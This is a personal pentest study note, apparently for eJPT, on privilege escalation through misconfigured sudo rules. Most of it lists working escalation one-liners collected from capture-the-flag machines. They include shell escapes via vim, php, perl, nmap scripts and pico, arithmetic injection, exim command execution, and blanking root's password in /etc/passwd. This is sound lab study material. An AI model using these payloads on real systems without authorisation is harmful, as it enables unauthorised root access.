---
type: technique
tags: [ejpt:host-net-pentest]
tools: [gtfobins]
cves: []
related: [[suid-enumeration]], [[ssh-bruteforce]]
---

# Sudo Abuse

Exploiting misconfigured `sudo` permissions to escalate privileges.

## Workflow

1. After any foothold, run `sudo -l` to list allowed commands and any `NOPASSWD` entries.
2. If a command can run as root (or as another user), look it up on [[gtfobins]] for an escalation payload.

## Payloads seen

- `sudo vim -c ':!/bin/sh' /dev/null` → root ([[trust]], [[obsession]], [[simple-ctf]]).
- `sudo ruby -e 'exec "/bin/sh"'` → root ([[vacaciones]]).
- `(sonic) NOPASSWD: ALL` → `sudo -u sonic ...`, then `(ALL) NOPASSWD: ALL` → `sudo su` ([[hedgehog]]).
- `sudo` group membership + `NOPASSWD: /bin/bash` → `sudo su` ([[borazuwara]]).
- `(hannah) NOPASSWD: /sbin/debugfs -w /opt/hannah_disk.img` → `debugfs: !/bin/bash` escapes to a shell as `hannah` ([[hannah-coffee]]).
- `(chocolate) NOPASSWD: /usr/bin/php` → `sudo -u chocolate php -r 'system("/bin/sh -i")'` → shell as `chocolate` ([[balulero]]).
- `(ALL) NOPASSWD: /usr/bin/node /home/mario/script.js` → overwrite `script.js` with a shell spawn → `sudo -u root ...` → root ([[nodeclimb]]).
- `(luisillo) NOPASSWD: /usr/bin/perl` → `sudo -u luisillo perl -e 'exec "/bin/sh"'` → shell as `luisillo` ([[psycho]]).
- `(ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py` + writable `/opt` dir → `rm /opt/paw.py` and rewrite with a shell spawn → root ([[psycho]]).
- `(pingu) NOPASSWD: /usr/bin/man` → `sudo -u pingu man man`, then `!/bin/bash` inside the pager → shell as `pingu` ([[anonymous-pingu]]).
- `(gladys) NOPASSWD: /usr/bin/nmap` → `nmap --script=/tmp/shell.nse` with `os.execute("/bin/sh <&1 >&1 2>&1")` → shell as `gladys` ([[anonymous-pingu]]).
- `(root) NOPASSWD: /usr/bin/chown` → take ownership of `/etc/passwd`, blank root's password → `su -` ([[anonymous-pingu]], see [[writable-etc-passwd]]).
- `(maci) NOPASSWD: /home/maci/script.sh` → script uses `[[ $num -eq 123123 ]]` → arithmetic injection `a[$(/bin/bash -p >&2)]` → shell as `maci` ([[bruteshock]], [[arithmetic-injection]]).
- `(pepe) NOPASSWD: /usr/sbin/exim` → `exim -be '${run{…}}'` runs commands as pepe ([[bruteshock]], [[exim-lpe]]).
- `(ALL) NOPASSWD: /usr/bin/dos2unix` → `dos2unix -f -n /tmp/passwd.new /etc/passwd` blanks root's password → `su -` ([[bruteshock]], [[writable-etc-passwd]]).
- `(ALL) NOPASSWD: /usr/bin/php` → `sudo -u root php -r 'system("/bin/sh -i")'` → root ([[littlepivoting]]).
- `(ALL) /usr/bin/vim` → `sudo -u root vim` then `:!/bin/bash` → root ([[littlepivoting]]).
- `(root) NOPASSWD: /usr/bin/env` → `sudo -u root env /bin/bash` → root ([[littlepivoting]]).
- `(ALL) NOPASSWD: /usr/bin/env` → `sudo /usr/bin/env /bin/sh -p` → root ([[flynn]]).
- `(hermonine) /usr/bin/pico` → `sudo -u hermonine pico`, then `^R` `^X` → `reset; sh 1>&0 2>&0` → shell as `hermonine` ([[madeyes-castle]]).
- `(ALL) NOPASSWD: ALL` → `sudo -u root /bin/bash -p` — unrestricted sudo still deserves a `sudo -l` check; there is nothing to abuse, just run the payload directly ([[analyst]]).
- `(ALL : ALL) /usr/bin/file` → **arbitrary root file read**, not a shell: `sudo -u root /usr/bin/file -f /opt/password.txt` treats each line of the file as a filename and echoes it back in the error output (``root:rooteable2: cannot open …``) → root's password → `su root` ([[dance-samba]], [[gtfobins]]). GTFOBins has a *file-read* section too — check it even when the binary can't spawn a shell.

## Seen in

[[hedgehog]], [[trust]], [[obsession]], [[vacaciones]], [[borazuwara]], [[simple-ctf]], [[hannah-coffee]], [[balulero]], [[nodeclimb]], [[psycho]], [[anonymous-pingu]], [[bruteshock]], [[littlepivoting]], [[madeyes-castle]], [[flynn]], [[analyst]], [[dance-samba]]
